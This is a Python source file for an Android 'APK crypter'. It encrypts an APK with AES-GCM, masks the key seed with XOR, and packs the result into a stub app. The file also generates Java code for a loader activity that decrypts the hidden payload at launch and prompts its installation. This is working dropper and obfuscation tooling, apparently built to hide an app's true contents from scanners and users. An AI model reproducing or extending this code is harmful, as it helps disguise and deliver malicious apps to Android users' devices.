import hashlib
import logging
import secrets
import shutil
from pathlib import Path

from Crypto.Cipher import AES

from services.stub_builder import StubBuilder

logger = logging.getLogger(__name__)


class APKCrypter:
    PAYLOAD_MAGIC = b"CRUPTOANON"
    PAYLOAD_VERSION = 2
    PAYLOAD_AAD = b"CRUPTOANON:payload:v2"
    KEY_WRAP_AAD = b"CRUPTOANON:keywrap:v2"
    GCM_NONCE_SIZE = 12
    GCM_TAG_SIZE = 16
    WRAP_SALT_SIZE = 16
    KEY_SIZE = 32

    def __init__(self):
        self.temp_dir = Path("temp")
        self.output_dir = Path("output")
        self.temp_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)
        self.loader_seed = secrets.token_bytes(self.KEY_SIZE)
        self.stub_builder = StubBuilder()
        logger.info("APKCrypter initialized")

    @staticmethod
    def _xor_bytes(left: bytes, right: bytes) -> bytes:
        return bytes(a ^ b for a, b in zip(left, right))

    def _derive_wrap_key(self, wrap_salt: bytes) -> bytes:
        digest = hashlib.sha256()
        digest.update(self.loader_seed)
        digest.update(wrap_salt)
        digest.update(self.KEY_WRAP_AAD)
        return digest.digest()

    def build_loader_protection_config(self) -> dict[str, str]:
        seed_mask = secrets.token_bytes(self.KEY_SIZE)
        seed_xor = self._xor_bytes(self.loader_seed, seed_mask)
        return {
            "seed_mask_hex": seed_mask.hex(),
            "seed_xor_hex": seed_xor.hex(),
        }

    def encrypt_apk(self, apk_path: str) -> bytes:
        """Encrypt an APK into a versioned AES-GCM payload with wrapped keys."""
        logger.info("Encrypting APK: %s", apk_path)
        with open(apk_path, "rb") as f:
            apk_data = f.read()

        logger.info("Original APK size: %s bytes", len(apk_data))

        payload_key = secrets.token_bytes(self.KEY_SIZE)
        payload_nonce = secrets.token_bytes(self.GCM_NONCE_SIZE)
        payload_cipher = AES.new(payload_key, AES.MODE_GCM, nonce=payload_nonce)
        payload_cipher.update(self.PAYLOAD_AAD)
        ciphertext, payload_tag = payload_cipher.encrypt_and_digest(apk_data)

        wrap_salt = secrets.token_bytes(self.WRAP_SALT_SIZE)
        wrap_key = self._derive_wrap_key(wrap_salt)
        wrap_nonce = secrets.token_bytes(self.GCM_NONCE_SIZE)
        wrap_cipher = AES.new(wrap_key, AES.MODE_GCM, nonce=wrap_nonce)
        wrap_cipher.update(self.KEY_WRAP_AAD)
        wrapped_key, wrap_tag = wrap_cipher.encrypt_and_digest(payload_key)

        encrypted = (
            self.PAYLOAD_MAGIC
            + bytes([self.PAYLOAD_VERSION])
            + wrap_salt
            + wrap_nonce
            + wrap_tag
            + payload_nonce
            + payload_tag
            + wrapped_key
            + ciphertext
        )
        logger.info("Encrypted payload size: %s bytes", len(encrypted))
        return encrypted

    def create_crypted_apk(self, apk_path: str) -> str:
        """Create the final stub APK with the encrypted payload bundled inside."""
        original_name = Path(apk_path).stem
        logger.info("Creating crypted APK for: %s", original_name)

        encrypted_data = self.encrypt_apk(apk_path)
        protection_config = self.build_loader_protection_config()

        logger.info("Building stub APK...")
        stub_apk = self.stub_builder.build_stub_apk(
            protection_config,
            apk_path,
            encrypted_data,
        )
        logger.info("Stub APK built: %s", stub_apk)

        output_apk = self.output_dir / f"{original_name}_crypted.apk"
        shutil.copy(stub_apk, output_apk)
        logger.info("Crypted APK ready: %s", output_apk)
        
        # Проверяем что payload.bin есть в APK
        import zipfile
        with zipfile.ZipFile(output_apk, 'r') as z:
            files = z.namelist()
            if 'assets/payload.bin' in files:
                payload_info = z.getinfo('assets/payload.bin')
                logger.info(f"✓ payload.bin найден в APK, размер: {payload_info.file_size} байт")
            else:
                logger.error(f"✗ payload.bin НЕ НАЙДЕН в APK! Файлы: {files}")

        return str(output_apk)

    def generate_loader_code(self) -> str:
        """Generate a standalone loader activity with the current payload format."""
        protection_config = self.build_loader_protection_config()
        payload_magic = self.PAYLOAD_MAGIC.decode("ascii")
        payload_aad = self.PAYLOAD_AAD.decode("ascii")
        key_wrap_aad = self.KEY_WRAP_AAD.decode("ascii")
        payload_version = self.PAYLOAD_VERSION

        return f'''package com.loader;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import androidx.core.content.FileProvider;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{

    private static final byte[] LOADER_SEED_MASK = hexToBytes("{protection_config["seed_mask_hex"]}");
    private static final byte[] LOADER_SEED_XOR = hexToBytes("{protection_config["seed_xor_hex"]}");
    private static final byte[] PAYLOAD_MAGIC = "{payload_magic}".getBytes(StandardCharsets.US_ASCII);
    private static final byte PAYLOAD_VERSION = (byte) {payload_version};
    private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);
    private static final byte[] KEY_WRAP_AAD = "{key_wrap_aad}".getBytes(StandardCharsets.US_ASCII);
    private static final int WRAP_SALT_LENGTH = {self.WRAP_SALT_SIZE};
    private static final int NONCE_LENGTH = {self.GCM_NONCE_SIZE};
    private static final int GCM_TAG_LENGTH = {self.GCM_TAG_SIZE};
    private static final int WRAPPED_KEY_LENGTH = {self.KEY_SIZE};

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        new Thread(() -> {{
            try {{
                InputStream is = getAssets().open("payload.bin");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {{
                    baos.write(buffer, 0, bytesRead);
                }}
                byte[] encryptedApk = baos.toByteArray();
                is.close();

                byte[] decryptedApk = decryptAES(encryptedApk);

                File tempApk = new File(getCacheDir(), "decrypted.apk");
                FileOutputStream fos = new FileOutputStream(tempApk);
                fos.write(decryptedApk);
                fos.close();

                runOnUiThread(() -> installApk(tempApk));
            }} catch (Exception e) {{
                e.printStackTrace();
                runOnUiThread(this::finish);
            }}
        }}).start();
    }}

    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        int minLength = PAYLOAD_MAGIC.length + 1 + WRAP_SALT_LENGTH + NONCE_LENGTH
            + GCM_TAG_LENGTH + NONCE_LENGTH + GCM_TAG_LENGTH + WRAPPED_KEY_LENGTH;
        if (encrypted.length < minLength) {{
            throw new IOException("Payload too short");
        }}

        for (int i = 0; i < PAYLOAD_MAGIC.length; i++) {{
            if (encrypted[i] != PAYLOAD_MAGIC[i]) {{
                throw new IOException("Invalid payload header");
            }}
        }}

        int offset = PAYLOAD_MAGIC.length;
        if (encrypted[offset] != PAYLOAD_VERSION) {{
            throw new IOException("Unsupported payload version");
        }}
        offset += 1;

        byte[] wrapSalt = new byte[WRAP_SALT_LENGTH];
        System.arraycopy(encrypted, offset, wrapSalt, 0, WRAP_SALT_LENGTH);
        offset += WRAP_SALT_LENGTH;

        byte[] wrapNonce = new byte[NONCE_LENGTH];
        System.arraycopy(encrypted, offset, wrapNonce, 0, NONCE_LENGTH);
        offset += NONCE_LENGTH;

        byte[] wrapTag = new byte[GCM_TAG_LENGTH];
        System.arraycopy(encrypted, offset, wrapTag, 0, GCM_TAG_LENGTH);
        offset += GCM_TAG_LENGTH;

        byte[] payloadNonce = new byte[NONCE_LENGTH];
        System.arraycopy(encrypted, offset, payloadNonce, 0, NONCE_LENGTH);
        offset += NONCE_LENGTH;

        byte[] payloadTag = new byte[GCM_TAG_LENGTH];
        System.arraycopy(encrypted, offset, payloadTag, 0, GCM_TAG_LENGTH);
        offset += GCM_TAG_LENGTH;

        byte[] wrappedKey = new byte[WRAPPED_KEY_LENGTH];
        System.arraycopy(encrypted, offset, wrappedKey, 0, WRAPPED_KEY_LENGTH);
        offset += WRAPPED_KEY_LENGTH;

        byte[] ciphertext = new byte[encrypted.length - offset];
        System.arraycopy(encrypted, offset, ciphertext, 0, ciphertext.length);

        byte[] wrapKey = deriveWrapKey(wrapSalt);
        byte[] payloadKey = decryptGcm(wrapKey, wrapNonce, KEY_WRAP_AAD, wrappedKey, wrapTag);
        try {{
            return decryptGcm(payloadKey, payloadNonce, PAYLOAD_AAD, ciphertext, payloadTag);
        }} finally {{
            zeroBytes(payloadKey);
            zeroBytes(wrapKey);
        }}
    }}

    private static byte[] decryptGcm(
        byte[] key,
        byte[] nonce,
        byte[] aad,
        byte[] ciphertext,
        byte[] tag
    ) throws Exception {{
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), spec);
        cipher.updateAAD(aad);

        byte[] input = new byte[ciphertext.length + tag.length];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, tag.length);
        return cipher.doFinal(input);
    }}

    private static byte[] deriveWrapKey(byte[] wrapSalt) throws Exception {{
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        digest.update(revealLoaderSeed());
        digest.update(wrapSalt);
        digest.update(KEY_WRAP_AAD);
        return digest.digest();
    }}

    private static byte[] revealLoaderSeed() {{
        byte[] seed = new byte[LOADER_SEED_MASK.length];
        for (int i = 0; i < seed.length; i++) {{
            seed[i] = (byte) (LOADER_SEED_MASK[i] ^ LOADER_SEED_XOR[i]);
        }}
        return seed;
    }}

    private static void zeroBytes(byte[] value) {{
        if (value == null) {{
            return;
        }}
        for (int i = 0; i < value.length; i++) {{
            value[i] = 0;
        }}
    }}

    private void installApk(File apkFile) {{
        Intent intent = new Intent(Intent.ACTION_VIEW);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            Uri apkUri = FileProvider.getUriForFile(
                this,
                getPackageName() + ".fileprovider",
                apkFile
            );
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_URI_PERMISSION);
        }} else {{
            intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        }}

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }}

    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }}
        return data;
    }}
}}'''
